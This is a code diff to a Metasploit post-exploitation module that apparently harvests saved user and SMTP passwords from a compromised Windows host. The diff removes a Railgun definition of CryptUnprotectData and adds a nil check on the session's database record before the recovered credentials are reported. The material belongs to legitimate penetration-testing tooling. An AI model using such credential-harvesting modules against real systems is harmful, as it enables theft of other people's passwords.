@@ -41,18 +41,6 @@ class Metasploit3 < Msf::Post
 		if (!rg.get_dll('crypt32'))
 			rg.add_dll('crypt32')
 		end
-
-		if (!rg.crypt32.functions["CryptUnprotectData"])
-			rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
-					["PBLOB","pDataIn", "in"],
-					["PWCHAR", "szDataDescr", "out"],
-					["PBLOB", "pOptionalEntropy", "in"],
-					["PDWORD", "pvReserved", "in"],
-					["PBLOB", "pPromptStruct", "in"],
-					["DWORD", "dwFlags", "in"],
-					["PBLOB", "pDataOut", "out"]
-				])
-		end
 	end
 
 
@@ -304,11 +292,16 @@ class Metasploit3 < Msf::Post
 				end
 
 				if got_user_pw == 1
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					report_auth_info(
 						:host  => host,
 						:port => portnum,
 						:sname => type,
-						:source_id => session.db_record.id,
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => user,
 						:pass => pass)
@@ -316,11 +309,16 @@ class Metasploit3 < Msf::Post
 				end
 
 				if smtp_use_auth != nil
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					report_auth_info(
 						:host  => smtp_server,
 						:port => smtp_port,
 						:sname => "SMTP",
-						:source_id => session.db_record.id,
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => smtp_user,
 						:pass => smtp_decrypted_password)
